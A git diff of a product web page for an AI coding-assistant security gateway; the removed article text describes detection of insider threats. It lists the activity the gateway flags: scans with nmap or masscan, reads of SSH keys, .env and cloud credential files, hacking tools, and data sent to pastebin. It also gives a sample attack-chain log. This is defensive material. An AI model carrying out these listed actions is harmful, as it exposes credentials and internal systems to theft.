@@ -3,8 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description" content="Technical Deep Dive - How Proxilion prevents insider threats when your employees have AI coding assistants. Architecture decisions, detection coverage, and deployment details.">
-    <title>Technical Deep Dive - Proxilion MCP Security Gateway</title>
+    <meta name="description" content="Proxilion MCP - Real-time threat detection for AI coding assistants. Analyze MCP tool calls to detect insider threats, compromised accounts, and rogue AI agents.">
+    <title>Proxilion MCP - Security Gateway for AI Coding Assistants</title>
 
     <!-- Favicons -->
     <link rel="icon" type="image/x-icon" href="favicon.ico">
@@ -13,15 +13,15 @@
     <link rel="apple-touch-icon" sizes="180x180" href="apple-touch-icon.png">
 
     <!-- SEO Meta Tags -->
-    <meta name="keywords" content="proxilion, mcp security, ai coding assistants, insider threat detection, claude code security, github copilot security, rust security gateway">
+    <meta name="keywords" content="proxilion mcp, ai security gateway, claude code security, github copilot security, cursor security, insider threat detection, mcp protocol security">
     <meta name="author" content="Clay Good">
     <meta name="robots" content="index, follow">
 
     <!-- Open Graph / Facebook -->
-    <meta property="og:type" content="article">
-    <meta property="og:url" content="https://proxilion.com/technical-deep-dive.html">
-    <meta property="og:title" content="Technical Deep Dive - Proxilion MCP Security Gateway">
-    <meta property="og:description" content="Preventing insider threats when your employees have AI coding assistants. Architecture, detection coverage, and real-world scenarios.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://proxilion.com/mcp.html">
+    <meta property="og:title" content="Proxilion MCP - Security Gateway for AI Coding Assistants">
+    <meta property="og:description" content="Real-time threat detection for Claude Code, Cursor, and Copilot. Detect credential harvesting, data exfiltration, and attack chains before damage is done.">
     <meta property="og:image" content="https://proxilion.com/og-image.png">
 
     <style>
@@ -41,8 +41,6 @@
             --accent-dim: #e0e0e0;
             --border: #1a1a1a;
             --border-hover: #333333;
-            --shadow: rgba(255, 255, 255, 0.05);
-            --code-bg: #0d0d0d;
             --radius-sm: 8px;
             --radius-md: 12px;
             --radius-lg: 20px;
@@ -65,7 +63,6 @@
             color: var(--text);
             line-height: 1.8;
             -webkit-font-smoothing: antialiased;
-            -moz-osx-font-smoothing: grayscale;
             overflow-x: hidden;
             font-size: 16px;
         }
@@ -94,24 +91,23 @@
             padding: clamp(16px, 2vw, 20px) 0;
             z-index: 1000;
             backdrop-filter: blur(16px);
-            -webkit-backdrop-filter: blur(16px);
         }
 
-        nav .nav-container {
-            max-width: 900px;
+        .nav-container {
+            max-width: 1200px;
             margin: 0 auto;
-            padding: 0 clamp(20px, 5vw, 40px);
+            padding: 0 clamp(20px, 5vw, 80px);
             display: flex;
             justify-content: space-between;
             align-items: center;
         }
 
-        nav .logo {
-            font-size: clamp(1.2rem, 2vw, 1.5rem);
+        .nav-logo {
+            font-size: 1.4rem;
             font-weight: 800;
-            color: var(--accent);
+            letter-spacing: -0.04em;
+            color: var(--text);
             text-decoration: none;
-            letter-spacing: -0.02em;
         }
 
         .nav-links {
@@ -157,236 +153,447 @@
         }
 
         .container {
-            max-width: 800px;
+            max-width: 1200px;
             margin: 0 auto;
-            padding: 0 clamp(20px, 5vw, 40px);
+            padding: 0 clamp(20px, 5vw, 80px);
             position: relative;
             z-index: 1;
         }
 
-        article {
-            margin-top: clamp(100px, 15vw, 140px);
-            margin-bottom: clamp(64px, 10vw, 100px);
-            animation: fadeIn 0.8s ease-out;
-        }
-
-        .article-header {
+        header {
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
             text-align: center;
-            margin-bottom: clamp(48px, 8vw, 80px);
-            padding-bottom: clamp(40px, 6vw, 60px);
-            border-bottom: 1px solid var(--border);
+            animation: fadeIn 0.8s ease-out;
+            padding: clamp(120px, 15vh, 160px) 0 clamp(60px, 10vh, 100px);
         }
 
-        .article-title {
-            font-size: clamp(2rem, 6vw, 3rem);
-            font-weight: 700;
-            letter-spacing: -0.03em;
-            margin-bottom: clamp(20px, 3vw, 30px);
-            line-height: 1.15;
-            color: var(--text);
-        }
-
-        .article-meta {
-            font-size: clamp(0.95rem, 1.5vw, 1.1rem);
-            color: var(--text-muted);
-            margin-top: clamp(16px, 2vw, 20px);
+        .badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 8px 16px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 100px;
+            font-size: 0.85rem;
             font-weight: 500;
-            text-transform: uppercase;
-            letter-spacing: 0.05em;
-        }
-
-        .article-content h2 {
-            font-size: clamp(1.75rem, 4vw, 2.25rem);
-            font-weight: 700;
-            margin-top: clamp(56px, 8vw, 80px);
-            margin-bottom: clamp(20px, 3vw, 28px);
-            letter-spacing: -0.02em;
-            color: var(--text);
-            line-height: 1.2;
-        }
-
-        .article-content h3 {
-            font-size: clamp(1.35rem, 3vw, 1.6rem);
-            font-weight: 600;
-            margin-top: clamp(40px, 6vw, 56px);
-            margin-bottom: clamp(16px, 2vw, 22px);
-            letter-spacing: -0.01em;
-            color: var(--text);
-        }
-
-        .article-content p {
-            font-size: clamp(1rem, 1.8vw, 1.125rem);
-            line-height: 1.85;
-            margin-bottom: clamp(20px, 3vw, 28px);
-            color: var(--text);
-        }
-
-        .article-content ul {
-            list-style: none;
-            margin: clamp(20px, 3vw, 28px) 0;
-            padding: 0;
-        }
-
-        .article-content ul li {
-            font-size: clamp(1rem, 1.8vw, 1.125rem);
-            line-height: 1.8;
-            margin-bottom: clamp(10px, 1.5vw, 14px);
-            padding-left: clamp(24px, 3vw, 32px);
-            position: relative;
-            color: var(--text);
-        }
-
-        .article-content ul li:before {
-            content: '';
-            position: absolute;
-            left: clamp(8px, 1vw, 12px);
-            top: 0.7em;
-            width: 6px;
-            height: 6px;
-            background: var(--accent);
-            border-radius: 50%;
-        }
-
-        .article-content strong {
             color: var(--accent);
-            font-weight: 600;
+            margin-bottom: 24px;
         }
 
-        .article-content code {
-            background: var(--code-bg);
-            padding: 3px 8px;
-            border-radius: 6px;
-            font-family: 'SF Mono', 'Monaco', 'Cascadia Code', 'Fira Code', monospace;
-            font-size: 0.88em;
+        .logo {
+            font-size: clamp(2.5rem, 8vw, 5rem);
+            font-weight: 800;
+            letter-spacing: -0.04em;
+            background: linear-gradient(180deg, #ffffff 0%, #888888 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            line-height: 1.1;
+            margin-bottom: 24px;
+        }
+
+        .tagline {
+            font-size: clamp(1.25rem, 3vw, 1.75rem);
+            font-weight: 500;
+            margin-bottom: 20px;
             color: var(--text);
-            border: 1px solid var(--border);
+            max-width: 700px;
+            line-height: 1.4;
         }
 
-        .article-content pre {
-            background: var(--code-bg);
-            border: 1px solid var(--border);
-            border-radius: var(--radius-md);
-            padding: clamp(20px, 3vw, 28px);
-            overflow-x: auto;
-            margin: clamp(24px, 4vw, 32px) 0;
+        .subtitle {
+            font-size: clamp(1rem, 1.8vw, 1.15rem);
+            color: var(--text-muted);
+            margin-bottom: 40px;
+            max-width: 680px;
             line-height: 1.7;
         }
 
-        .article-content pre code {
-            background: none;
-            padding: 0;
-            border: none;
-            font-size: clamp(0.85rem, 1.5vw, 0.95rem);
-        }
-
-        .article-content a {
-            color: var(--accent);
-            text-decoration: underline;
-            text-underline-offset: 3px;
-            transition: opacity var(--transition-fast);
-        }
-
-        .article-content a:hover {
-            opacity: 0.75;
-        }
-
-        .highlight-box {
-            background: var(--bg-card);
-            border-left: 4px solid var(--accent);
-            padding: clamp(24px, 4vw, 32px);
-            margin: clamp(32px, 5vw, 44px) 0;
-            border-radius: var(--radius-sm);
-        }
-
-        .highlight-box p {
-            margin-bottom: 0;
-            font-size: clamp(1.05rem, 1.8vw, 1.2rem);
-            color: var(--text);
-        }
-
-        .highlight-box p + p {
-            margin-top: clamp(12px, 2vw, 16px);
-        }
-
-        .scenario-box {
-            background: var(--bg-card);
-            border: 1px solid var(--border);
-            border-radius: var(--radius-lg);
-            padding: clamp(28px, 4vw, 40px);
-            margin: clamp(32px, 5vw, 44px) 0;
-        }
-
-        .scenario-box h4 {
-            font-size: clamp(1.25rem, 2.5vw, 1.5rem);
-            margin-bottom: clamp(16px, 2vw, 22px);
-            color: var(--accent);
-            font-weight: 600;
-        }
-
-        .scenario-box p {
-            margin-bottom: clamp(16px, 2vw, 20px);
-        }
-
-        .scenario-box pre {
-            margin: clamp(16px, 2vw, 20px) 0;
-        }
-
-        .scenario-box ul {
-            margin: clamp(16px, 2vw, 20px) 0;
+        .cta-group {
+            display: flex;
+            gap: 16px;
+            flex-wrap: wrap;
+            justify-content: center;
+            margin-bottom: 48px;
         }
 
         .btn-primary {
             display: inline-flex;
             align-items: center;
-            justify-content: center;
-            padding: clamp(16px, 2vw, 20px) clamp(36px, 5vw, 50px);
-            background: var(--bg);
-            color: var(--accent);
+            gap: 8px;
+            padding: 16px 32px;
+            background: var(--accent);
+            color: #000;
             text-decoration: none;
             font-weight: 600;
-            font-size: clamp(0.9rem, 1.5vw, 1.05rem);
-            letter-spacing: 0.02em;
-            text-transform: uppercase;
+            font-size: 1rem;
+            border-radius: var(--radius-md);
             transition: all var(--transition-smooth);
             border: 2px solid var(--accent);
-            border-radius: var(--radius-md);
-            box-shadow: 0 4px 24px rgba(255, 255, 255, 0.08);
-            min-height: 56px;
         }
 
         .btn-primary:hover {
-            background: var(--accent);
-            color: var(--bg);
+            background: transparent;
+            color: var(--accent);
             transform: translateY(-2px);
-            box-shadow: 0 8px 32px rgba(255, 255, 255, 0.15);
+            box-shadow: 0 8px 24px rgba(255, 255, 255, 0.15);
         }
 
-        .btn-primary:active {
-            transform: translateY(0);
+        .btn-secondary {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 16px 32px;
+            background: transparent;
+            color: var(--text);
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 1rem;
+            border-radius: var(--radius-md);
+            transition: all var(--transition-smooth);
+            border: 2px solid var(--border-hover);
         }
 
-        footer {
+        .btn-secondary:hover {
+            border-color: var(--text-muted);
+            background: rgba(255, 255, 255, 0.03);
+        }
+
+        /* Stats Banner */
+        .stats-banner {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 24px;
+            margin-top: 48px;
+            padding: 32px 40px;
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: var(--radius-lg);
+            width: 100%;
+            max-width: 800px;
+        }
+
+        .stat-item {
             text-align: center;
-            padding: clamp(48px, 8vw, 64px) 0;
+        }
+
+        .stat-number {
+            font-size: clamp(1.5rem, 3vw, 2rem);
+            font-weight: 800;
+            color: var(--accent);
+            margin-bottom: 4px;
+        }
+
+        .stat-label {
+            font-size: 0.75rem;
             color: var(--text-muted);
-            font-size: clamp(0.9rem, 1.5vw, 1rem);
+            text-transform: uppercase;
+            letter-spacing: 0.08em;
+            font-weight: 600;
+        }
+
+        /* Sections */
+        section {
+            padding: clamp(64px, 10vw, 100px) 0;
             border-top: 1px solid var(--border);
         }
 
-        footer a {
+        .section-header {
+            text-align: center;
+            margin-bottom: clamp(40px, 6vw, 56px);
+        }
+
+        .section-title {
+            font-size: clamp(1.75rem, 4vw, 2.5rem);
+            font-weight: 700;
+            letter-spacing: -0.03em;
+            margin-bottom: 16px;
+            color: var(--text);
+        }
+
+        .section-subtitle {
+            font-size: clamp(1rem, 1.8vw, 1.1rem);
+            color: var(--text-muted);
+            max-width: 640px;
+            margin: 0 auto;
+            line-height: 1.7;
+        }
+
+        .section-alt {
+            background: var(--bg-secondary);
+            margin: 0 calc(-1 * clamp(20px, 5vw, 80px));
+            padding-left: clamp(20px, 5vw, 80px);
+            padding-right: clamp(20px, 5vw, 80px);
+        }
+
+        /* Features Grid */
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(min(100%, 300px), 1fr));
+            gap: 20px;
+        }
+
+        .feature-card {
+            padding: 28px;
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: var(--radius-lg);
+            transition: all var(--transition-smooth);
+        }
+
+        .feature-card:hover {
+            transform: translateY(-4px);
+            border-color: var(--border-hover);
+            box-shadow: 0 16px 48px rgba(0, 0, 0, 0.2);
+        }
+
+        .feature-icon {
+            width: 40px;
+            height: 40px;
+            margin-bottom: 16px;
             color: var(--accent);
-            text-decoration: none;
+        }
+
+        .feature-title {
+            font-size: 1.1rem;
             font-weight: 600;
-            transition: opacity var(--transition-fast);
+            margin-bottom: 8px;
+            color: var(--text);
+        }
+
+        .feature-text {
+            font-size: 0.95rem;
+            color: var(--text-muted);
+            line-height: 1.6;
+        }
+
+        /* Architecture Diagram */
+        .architecture-box {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: var(--radius-lg);
+            padding: 32px;
+            font-family: 'SF Mono', 'Menlo', 'Monaco', monospace;
+            font-size: 0.9rem;
+            line-height: 1.6;
+            color: var(--text-muted);
+            text-align: center;
+            margin-bottom: 48px;
+        }
+
+        .architecture-box .highlight {
+            color: var(--accent);
+            font-weight: 600;
+        }
+
+        /* Analyzer Table */
+        .analyzer-table {
+            width: 100%;
+            border-collapse: collapse;
+            background: var(--bg-card);
+            border-radius: var(--radius-lg);
+            overflow: hidden;
+            border: 1px solid var(--border);
+        }
+
+        .analyzer-table th,
+        .analyzer-table td {
+            padding: 16px 20px;
+            text-align: left;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .analyzer-table th {
+            background: var(--bg-secondary);
+            font-weight: 600;
+            font-size: 0.85rem;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+            color: var(--text-muted);
+        }
+
+        .analyzer-table td {
+            font-size: 0.95rem;
+        }
+
+        .analyzer-table tr:last-child td {
+            border-bottom: none;
+        }
+
+        .analyzer-table .category {
+            color: var(--accent);
+            font-weight: 600;
+        }
+
+        /* Scenario Boxes */
+        .scenario-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(min(100%, 350px), 1fr));
+            gap: 24px;
+        }
+
+        .scenario-card {
+            padding: 32px;
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: var(--radius-lg);
+            transition: all var(--transition-smooth);
+        }
+
+        .scenario-card:hover {
+            transform: translateY(-4px);
+            border-color: var(--border-hover);
+        }
+
+        .scenario-title {
+            font-size: 1.25rem;
+            font-weight: 600;
+            margin-bottom: 12px;
+            color: var(--text);
+        }
+
+        .scenario-text {
+            font-size: 0.95rem;
+            color: var(--text-muted);
+            line-height: 1.7;
+            margin-bottom: 16px;
+        }
+
+        .scenario-code {
+            background: var(--bg-secondary);
+            padding: 16px;
+            border-radius: var(--radius-sm);
+            font-family: 'SF Mono', 'Menlo', 'Monaco', monospace;
+            font-size: 0.85rem;
+            color: var(--text-muted);
+            overflow-x: auto;
+            margin-bottom: 16px;
+        }
+
+        .scenario-result {
+            font-size: 0.9rem;
+            padding: 12px 16px;
+            border-radius: var(--radius-sm);
+            background: rgba(255, 100, 100, 0.1);
+            border: 1px solid rgba(255, 100, 100, 0.2);
+            color: #ff9999;
+        }
+
+        .scenario-result.success {
+            background: rgba(100, 255, 150, 0.1);
+            border-color: rgba(100, 255, 150, 0.2);
+            color: #99ffaa;
+        }
+
+        /* Mode Table */
+        .mode-table {
+            width: 100%;
+            border-collapse: collapse;
+            background: var(--bg-card);
+            border-radius: var(--radius-lg);
+            overflow: hidden;
+            border: 1px solid var(--border);
+            margin-top: 32px;
+        }
+
+        .mode-table th,
+        .mode-table td {
+            padding: 14px 16px;
+            text-align: center;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .mode-table th {
+            background: var(--bg-secondary);
+            font-weight: 600;
+            font-size: 0.8rem;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+            color: var(--text-muted);
+        }
+
+        .mode-table td {
+            font-size: 0.9rem;
+        }
+
+        .mode-table tr:last-child td {
+            border-bottom: none;
+        }
+
+        .mode-table td:first-child {
+            color: var(--accent);
+            font-weight: 600;
+            text-align: left;
+        }
+
+        /* CTA Section */
+        .final-cta {
+            text-align: center;
+            padding: clamp(48px, 8vw, 72px) clamp(24px, 5vw, 48px);
+            background: var(--accent);
+            color: #000;
+            border-radius: var(--radius-lg);
+            margin: clamp(48px, 8vw, 72px) 0;
+            box-shadow: 0 20px 60px rgba(255, 255, 255, 0.15);
+        }
+
+        .final-cta h2 {
+            font-size: clamp(1.5rem, 4vw, 2.25rem);
+            font-weight: 700;
+            margin-bottom: 16px;
+        }
+
+        .final-cta p {
+            font-size: clamp(1rem, 1.8vw, 1.1rem);
+            margin-bottom: 32px;
+            opacity: 0.9;
+            max-width: 500px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .final-cta .btn-primary {
+            background: #000;
+            color: var(--accent);
+            border-color: #000;
+        }
+
+        .final-cta .btn-primary:hover {
+            background: transparent;
+            color: #000;
+            border-color: #000;
+            box-shadow: none;
+        }
+
+        /* Footer */
+        footer {
+            text-align: center;
+            padding: clamp(40px, 6vw, 56px) 0;
+            color: var(--text-muted);
+            font-size: 0.9rem;
+        }
+
+        footer a {
+            color: var(--text);
+            text-decoration: none;
+            transition: color var(--transition-fast);
         }
 
         footer a:hover {
-            opacity: 0.7;
+            color: var(--accent);
         }
 
-        footer p + p {
-            margin-top: clamp(12px, 2vw, 16px);
-            font-size: clamp(0.8rem, 1.3vw, 0.9rem);
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 24px;
+            margin-top: 16px;
+            flex-wrap: wrap;
         }
 
         /* Mobile Menu Toggle */
@@ -506,30 +713,41 @@
 
         /* Responsive */
         @media (max-width: 768px) {
-            .nav-links { display: none; }
-            .nav-cta { display: none; }
-            .mobile-menu-toggle { display: flex; }
+            .nav-links {
+                display: none;
+            }
 
-            .btn-primary {
-                width: 100%;
-                text-align: center;
+            .nav-cta {
+                display: none;
+            }
+
+            .mobile-menu-toggle {
+                display: flex;
+            }
+
+            .stats-banner {
+                grid-template-columns: repeat(2, 1fr);
+            }
+
+            .section-alt {
+                margin-left: -20px;
+                margin-right: -20px;
+                padding-left: 20px;
+                padding-right: 20px;
+            }
+
+            .cta-group {
+                flex-direction: column;
+                align-items: stretch;
+                max-width: 280px;
+                margin-left: auto;
+                margin-right: auto;
             }
         }
 
-        /* Touch-friendly */
-        @media (hover: none) and (pointer: coarse) {
-            .btn-primary {
-                min-height: 56px;
-            }
-        }
-
-        /* Reduced motion */
         @media (prefers-reduced-motion: reduce) {
-            *,
-            *::before,
-            *::after {
+            * {
                 animation-duration: 0.01ms !important;
-                animation-iteration-count: 1 !important;
                 transition-duration: 0.01ms !important;
             }
         }
@@ -538,13 +756,13 @@
 <body>
     <nav>
         <div class="nav-container">
-            <a href="/" class="logo">PROXILION</a>
+            <a href="/" class="nav-logo">PROXILION</a>
             <ul class="nav-links">
                 <li><a href="/">SDK</a></li>
-                <li><a href="mcp.html" class="active">MCP Gateway</a></li>
+                <li><a href="mcp.html" class="active">MCP</a></li>
                 <li><a href="grc.html">GRC</a></li>
             </ul>
-            <a href="https://github.com/clay-good/proxilion-mcp" target="_blank" class="nav-cta">
+            <a href="https://github.com/clay-good/proxilion-mcp" class="nav-cta" target="_blank" rel="noopener">
                 <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/></svg>
                 GitHub
             </a>
@@ -559,273 +777,373 @@
     <div class="mobile-menu">
         <ul class="mobile-menu-links">
             <li><a href="/">SDK</a></li>
-            <li><a href="mcp.html" class="active">MCP Gateway</a></li>
+            <li><a href="mcp.html" class="active">MCP</a></li>
             <li><a href="grc.html">GRC</a></li>
         </ul>
-        <a href="https://github.com/clay-good/proxilion-mcp" class="mobile-menu-cta" target="_blank">
+        <a href="https://github.com/clay-good/proxilion-mcp" class="mobile-menu-cta" target="_blank" rel="noopener">
             <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/></svg>
             GitHub
         </a>
     </div>
 
     <div class="container">
-        <article>
-            <header class="article-header">
-                <h1 class="article-title">Preventing Insider Threats in AI Coding Assistants</h1>
-                <p class="article-meta">Technical Deep Dive</p>
-            </header>
+        <header>
+            <div class="badge">
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+                MCP Security Gateway
+            </div>
+            <h1 class="logo">Proxilion MCP</h1>
+            <p class="tagline">Detect Insider Threats in AI Coding Assistants</p>
+            <p class="subtitle">
+                Real-time threat analysis for Claude Code, Cursor, Copilot, and Windsurf.
+                Detect credential harvesting, data exfiltration, and attack chains before they execute.
+            </p>
 
-            <div class="article-content">
-                <p>On November 13, 2025, Anthropic published <a href="https://www.anthropic.com/news/disrupting-AI-espionage" target="_blank">a report</a> documenting the first large-scale AI-orchestrated cyber espionage campaign (GTG-1002). The attackers used Claude Code with 80-90% autonomy to discover vulnerabilities, generate exploits, harvest credentials, and exfiltrate data.</p>
+            <div class="cta-group">
+                <a href="https://github.com/clay-good/proxilion-mcp" class="btn-primary" target="_blank" rel="noopener">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/></svg>
+                    Get Started
+                </a>
+                <a href="https://github.com/clay-good/proxilion-mcp#documentation" class="btn-secondary" target="_blank" rel="noopener">
+                    Documentation
+                </a>
+            </div>
 
-                <p>The attackers controlled their own infrastructure. They weren't exploiting victims' AI tools.</p>
-
-                <h2>The Real Threat</h2>
-
-                <p>The actual risk for organizations isn't external attackers using AI. It's insiders weaponizing the AI tools you've already deployed:</p>
-
-                <ul>
-                    <li>Disgruntled employee uses Claude Code to exfiltrate the customer database</li>
-                    <li>Compromised account uses GitHub Copilot to scan internal networks and harvest SSH keys</li>
-                    <li>Rogue AI agent exceeds its scope and accesses production credentials</li>
-                </ul>
-
-                <div class="highlight-box">
-                    <p>Organizations deploy Claude Code, Copilot, and Cursor to thousands of employees with zero security monitoring.</p>
+            <div class="stats-banner">
+                <div class="stat-item">
+                    <div class="stat-number">24</div>
+                    <div class="stat-label">Threat Analyzers</div>
                 </div>
-
-                <h2>What Proxilion Does</h2>
-
-                <p>Proxilion sits between AI coding assistants and their tool execution layer. Every bash command, file access, or API call goes through real-time threat analysis before execution.</p>
-
-                <h3>Why Rust?</h3>
-
-                <p>The gateway processes thousands of requests per second with <50ms P95 latency:</p>
-
-                <ul>
-                    <li><strong>Memory safety:</strong> The gateway cannot become an attack vector. No buffer overflows or use-after-free vulnerabilities.</li>
-                    <li><strong>Zero-cost abstractions:</strong> Pattern matching and regex compilation happen at compile time.</li>
-                    <li><strong>Fearless concurrency:</strong> Thread-safe session state tracking without locks.</li>
-                    <li><strong>No garbage collection:</strong> Predictable latency under load.</li>
-                    <li><strong>Single binary deployment:</strong> No dependencies, no runtime. Build once, deploy anywhere.</li>
-                </ul>
-
-                <h3>Why MCP Layer?</h3>
-
-                <p>Model Context Protocol (MCP) is where AI tools execute actions:</p>
-
-                <ul>
-                    <li><strong>Universal coverage:</strong> Works with Claude Code, Cursor, Windsurf, any MCP-compatible tool</li>
-                    <li><strong>Pre-execution analysis:</strong> We see commands before they run, not after damage is done</li>
-                    <li><strong>Full context:</strong> Tool calls include conversation history for social engineering detection</li>
-                    <li><strong>Low latency:</strong> HTTP interceptor adds <50ms</li>
-                    <li><strong>No AI modification:</strong> Drop-in proxy, no changes to Claude or other AI models</li>
-                </ul>
-
-                <h2>Detection Coverage</h2>
-
-                <p><strong>High-confidence detection (90-100%):</strong></p>
-                <ul>
-                    <li>Network reconnaissance (nmap, masscan, service enumeration)</li>
-                    <li>Credential file access (SSH keys, .env files, cloud credentials)</li>
-                    <li>Hacking tools (sqlmap, metasploit, burpsuite)</li>
-                    <li>Privilege escalation (sudo abuse, setuid manipulation, IAM role changes)</li>
-                </ul>
-
-                <p><strong>Medium-confidence detection (70-90%):</strong></p>
-                <ul>
-                    <li>Data exfiltration (curl to pastebin, large transfers to external IPs)</li>
-                    <li>Multi-phase kill chains (reconnaissance → access → exfiltration over hours)</li>
-                    <li>Social engineering (conversation analysis, pretexting, authority manipulation)</li>
-                    <li>Lateral movement (SSH/RDP across internal networks, port scanning)</li>
-                </ul>
-
-                <p><strong>Detection limitations (30-70%):</strong></p>
-                <ul>
-                    <li>Novel attack techniques not in our pattern database</li>
-                    <li>Highly fragmented attacks (50+ micro-requests over weeks)</li>
-                    <li>Attacks specifically designed to evade pattern detection</li>
-                    <li>Zero-day exploits with no behavioral indicators</li>
-                </ul>
-
-                <div class="highlight-box">
-                    <p><strong>Overall detection rate:</strong> 75-85% against sophisticated attacks like GTG-1002.</p>
-                    <p style="margin-top: 15px;">This is one layer in defense-in-depth, not a silver bullet.</p>
+                <div class="stat-item">
+                    <div class="stat-number">&lt;50ms</div>
+                    <div class="stat-label">P95 Latency</div>
                 </div>
-
-                <h2>Detection Engine</h2>
-
-                <p><strong>25 specialized analyzers</strong> running in parallel:</p>
-
-                <p><strong>Pattern-Based (18 analyzers):</strong></p>
-                <ul>
-                    <li>Enumeration: nmap, masscan, port scans, service discovery</li>
-                    <li>Credential Access: SSH keys, .env, .aws/credentials, cloud configs</li>
-                    <li>Exfiltration: URL analysis for pastebin, suspicious IPs, large POST bodies</li>
-                    <li>Hacking Tools: sqlmap, metasploit, burpsuite, nikto</li>
-                    <li>Privilege Escalation: sudo abuse, setuid binaries, IAM policy changes</li>
-                    <li>Lateral Movement: SSH/RDP connections, network pivoting</li>
-                </ul>
-
-                <p><strong>Session-Aware (4 analyzers):</strong></p>
-                <ul>
-                    <li>Session Progression: Kill chain tracking (recon → access → exfil)</li>
-                    <li>Request Rate: Burst detection, machine timing vs. human timing</li>
-                    <li>AI Velocity: Autonomous agent detection, acceleration patterns</li>
-                    <li>Task Fragmentation: Multi-request attacks spread across time</li>
-                </ul>
-
-                <p><strong>Semantic Analysis (3 analyzers) - Optional, requires Claude API:</strong></p>
-                <ul>
-                    <li>Conversation Analysis: Social engineering detection</li>
-                    <li>Prompt Engineering: Jailbreak attempt detection</li>
-                    <li>Intent Clarification: Ambiguous command analysis</li>
-                </ul>
-
-                <p><strong>Scoring:</strong> Each analyzer returns 0-100. Composite score is weighted average.</p>
-                <ul>
-                    <li>0-49: Allow (audit log only)</li>
-                    <li>50-69: Alert (notify security team, allow execution)</li>
-                    <li>70-89: Block (prevent this specific command)</li>
-                    <li>90-100: Terminate (kill entire session, disable user)</li>
-                </ul>
-
-                <h3>Session State Tracking</h3>
-
-                <p>Redis tracks session history across hours and days for kill chain detection:</p>
-
-                <pre><code>Monday 10:00 AM: nmap scan (score: 85, BLOCKED)
-Monday 2:30 PM: cat .env (score: 70, BLOCKED)
-Monday 6:45 PM: curl pastebin (score: 65, ALERT)
-
-Session Progression: 3 phases detected across 9 hours
-Composite Score: 96 (TERMINATE SESSION)</code></pre>
-
-                <p>Individual requests might score below blocking threshold, but multi-phase progression triggers termination.</p>
-
